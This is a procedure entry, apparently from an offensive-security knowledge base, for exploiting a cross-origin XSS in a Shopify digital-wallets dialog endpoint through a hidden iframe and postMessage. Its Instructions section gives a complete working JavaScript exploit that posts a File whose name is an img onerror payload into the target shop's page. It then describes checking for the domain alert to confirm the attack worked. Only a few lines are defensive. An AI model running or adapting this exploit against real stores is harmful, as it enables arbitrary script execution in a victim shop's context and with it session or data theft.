---
id: proc-execute-xss
tags:
  - exploit
  - iframe
  - xss-execution
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/execute-iframe-exploit]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-13T23:56:03.416Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Exploit Public-Facing Application]]'
---
# Execute-XSS-via-Iframe-PostMessage

## Summary

This procedure executes the XSS exploit by loading the vulnerable Shopify endpoint in a hidden iframe from an attacker-controlled page and sending the malicious postMessage payload immediately after load.

## Description

Create an iframe targeting /:id/digital_wallets/dialog, wait for onload, then postMessage the payload with the malicious File in lineItems. The cloned payload bypasses escaping, inserts into DOM, and executes JS in the shop's context without interaction.

## Requirements

1. Attacker-controlled HTML page
2. Target shop URL
3. JS execution permissions

## Defense

Defensive measures and detection strategies:

- Validate iframe sources and postMessage origins strictly.
- Disable or sandbox postMessage in third-party contexts.
- Monitor for cross-origin iframe loads and messages.

## Objectives

1. Inject payload cross-origin via postMessage.
2. Trigger arbitrary JS execution on target domain.
3. Demonstrate domain alert for proof.

## Instructions

### Step 1: Create and Load Iframe

**Context**: Prompt for target and set up hidden iframe.

**Command** ([[commands/execute-iframe-exploit]]):
```javascript
let shop =prompt("Enter a Target Shop URL:","https://bored-engineering-whitehat-2.myshopify.com"); let frame = document.createElement("iframe"); frame.src =`${shop}/1337/digital_wallets/dialog`; frame.style.display ="none"; frame.onload=()=>{ frame.contentWindow.postMessage({type:"DigitalWalletsDialog:change",digitalWalletsDialog:true,payload:{title:"placeholder",button:"placeholder",lineItems:[new File([""],"<img src=xx: onerror=alert(document.domain)>")],},},"*");} document.body.appendChild(frame);
```

> Runs in attacker page; onload sends payload to frame.contentWindow.

### Step 2: Validate Execution

**Context**: Observe alert in the iframe context.

Check browser for alert popup with shop domain (e.g., bored-engineering-whitehat-2.myshopify.com).

> Success if alert fires; inspect iframe DOM for inserted <img>.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]
- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/execute-iframe-exploit]]

## Tools Used


## Tags

- exploit
- xss-execution
